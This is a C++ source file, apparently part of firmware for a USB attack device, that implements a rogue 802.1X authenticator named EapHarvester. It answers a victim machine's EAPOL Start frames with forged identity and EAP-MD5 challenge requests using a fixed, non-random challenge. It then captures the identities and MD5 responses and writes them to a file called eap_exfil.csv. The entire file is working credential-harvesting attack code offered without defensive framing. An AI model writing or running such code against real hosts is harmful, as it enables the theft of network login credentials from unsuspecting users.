#include "EapHarvester.h"
#include "../../Debug/Logging.h"
#include "../../Devices/USB/USBNCM.h"
#include "../../Devices/Storage/HardwareStorage.h"
#include <cstring>

#define LOG_EAP "EAP"

namespace Attacks {
    EapHarvester Eap;
}

// Global hook
void onEapPacket(const uint8_t* buffer, uint32_t len) {
    if (Attacks::Eap.isRunning()) {
        Attacks::Eap.processPacket(buffer, len);
    }
}

EapHarvester::EapHarvester() {}

void EapHarvester::begin(Preferences& prefs) {
}

void EapHarvester::loop(Preferences& prefs) {
}

void EapHarvester::end() {
    stop();
}

void EapHarvester::start() {
    if (running) return;
    Debug::Log.info(LOG_EAP, "Starting EAP Harvester (Rogue Authenticator)...");
    
    // Register hook
    Devices::USB::NCM.setPacketHandler(&onEapPacket);
    
    running = true;
    capturedCreds.clear();
}

void EapHarvester::stop() {
    running = false;
    Devices::USB::NCM.setPacketHandler(nullptr);
    Debug::Log.info(LOG_EAP, "EAP Harvester Stopped");
}

void EapHarvester::processPacket(const uint8_t* buffer, uint32_t len) {
    if (len < 14) return;
    
    // Check EtherType (Offset 12)
    uint16_t etherType = (buffer[12] << 8) | buffer[13];
    if (etherType != EAPOL_ETHERTYPE) return;
    
    // EAPOL Header: Ver(1), Type(1), Len(2)
    // Offset 14
    if (len < 18) return;
    uint8_t version = buffer[14];
    uint8_t type = buffer[15];
    
    // Extract Source MAC for response
    uint8_t srcMac[6];
    memcpy(srcMac, buffer + 6, 6);
    
    Debug::Log.info(LOG_EAP, "Received EAPOL Packet Type: " + std::to_string(type));
    
    if (type == 1) { // EAPOL Start
        Debug::Log.info(LOG_EAP, "Victim requested EAPOL Start. Sending Identity Request.");
        sendIdentityRequest(srcMac);
    }
    else if (type == 0) { // EAP Packet
        // EAP Header: Code(1), Id(1), Len(2), Type(1)
        uint8_t eapCode = buffer[18];
        uint8_t eapId = buffer[19];
        // uint16_t eapLen = (buffer[20] << 8) | buffer[21];
        uint8_t eapType = buffer[22];
        
        if (eapCode == EAP_CODE_RESPONSE) {
            if (eapType == EAP_TYPE_IDENTITY) {
                // Identity Response
                // Data is following Type
                // Length of data = eapLen - 5 (Code+Id+Len+Type)
                // We just read until end of frame (or use len)
                // Typically Identity is purely the string
                
                std::string identity = "";
                int payloadLen = len - 23; 
                if (payloadLen > 0) {
                    char temp[payloadLen + 1];
                    memcpy(temp, buffer + 23, payloadLen);
                    temp[payloadLen] = 0;
                    identity = std::string(temp);
                }
                
                Debug::Log.info(LOG_EAP, "Captured Identity: " + identity);
                
                // Store in temp (or just assumption: single threading)
                // TODO: Store in map mapped by MAC to handle multiple victims properly
                
                sendMd5Challenge(srcMac, eapId + 1); // Increment ID
                
                // Temporary log for state tracking
                Debug::Log.info(LOG_EAP, "Sent MD5 Challenge to " + identity);
            }
            else if (eapType == EAP_TYPE_MD5_CHALLENGE) {
                // MD5 Response
                // Format: [Value-Size(1)][Value(16)][Name(Optional)]
                uint8_t valSize = buffer[23];
                if (valSize == 16 && len >= 24 + 16) {
                    char responseHex[33];
                    for(int i=0; i<16; i++) sprintf(responseHex + (i*2), "%02X", buffer[24+i]);
                    responseHex[32] = 0;
                    
                    Debug::Log.info(LOG_EAP, "Captured MD5 Response: " + std::string(responseHex));
                    
                    char macStr[18];
                    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]);
                    
                    logCredentials("Unknown(LastSeen)", "RANDOM", std::string(responseHex), std::string(macStr));
                }
            }
        }
    }
}

void EapHarvester::sendIdentityRequest(const uint8_t* destMac) {
    // Construct EAP Request/Identity
    uint8_t packet[64]; // Minimum ethernet frame size
    memset(packet, 0, sizeof(packet));
    
    // Ethernet Header
    memcpy(packet, destMac, 6);
    // Source: Fake Switch 00:00:00:00:00:01
    packet[6] = 0x00; packet[7] = 0x01; packet[8] = 0x02; packet[9] = 0x03; packet[10] = 0x04; packet[11] = 0x05;
    
    packet[12] = 0x88; packet[13] = 0x8E; // EAPOL
    
    // EAPOL Header
    packet[14] = 0x01; // Ver
    packet[15] = 0x00; // Type: Packet
    
    // Len: EAP packet length (Code+Id+Len+Type = 5)
    packet[16] = 0x00; packet[17] = 0x05;
    
    // EAP Packet
    packet[18] = EAP_CODE_REQUEST; // Code 1
    packet[19] = 0x01; // ID 1
    packet[20] = 0x00; packet[21] = 0x05; // Len 5
    packet[22] = EAP_TYPE_IDENTITY; // Type 1
    
    Devices::USB::NCM.injectPacket(packet, 64); // Send padded
}

void EapHarvester::sendMd5Challenge(const uint8_t* destMac, uint8_t id) {
    uint8_t packet[128];
    memset(packet, 0, sizeof(packet));
    
    // Ethernet Header
    memcpy(packet, destMac, 6);
    packet[6] = 0x00; packet[7] = 0x01; packet[8] = 0x02; packet[9] = 0x03; packet[10] = 0x04; packet[11] = 0x05;
    packet[12] = 0x88; packet[13] = 0x8E;
    
    // EAP Packet Construction
    // Code(1), ID(id), Len(22), Type(4), ValSize(16), Value(16)
    // 1+1+2+1+1+16 = 22 bytes
    
    // EAPOL Header
    packet[14] = 0x01;
    packet[15] = 0x00;
    packet[16] = 0x00; packet[17] = 22; // length
    
    // EAP
    packet[18] = EAP_CODE_REQUEST;
    packet[19] = id;
    packet[20] = 0x00; packet[21] = 22;
    packet[22] = EAP_TYPE_MD5_CHALLENGE;
    packet[23] = 16; // Value Size
    
    // Random Challenge (0x1122...)
    for (int i=0; i<16; i++) packet[24+i] = (uint8_t)i; 
    
    Devices::USB::NCM.injectPacket(packet, 64);
}

void EapHarvester::logCredentials(const std::string& user, const std::string& challenge, const std::string& response, const std::string& mac) {
    EapPromise p = {user, challenge, response, mac};
    capturedCreds.push_back(p);
    
    std::string msg = "Captured EAP-MD5: User=" + user + " Challenge=" + challenge + " Response=" + response;
    Debug::Log.info(LOG_EAP, msg);
    
    Devices::Storage.appendToFile("eap_exfil.csv", mac + "," + user + "," + challenge + "," + response + "\n");
}
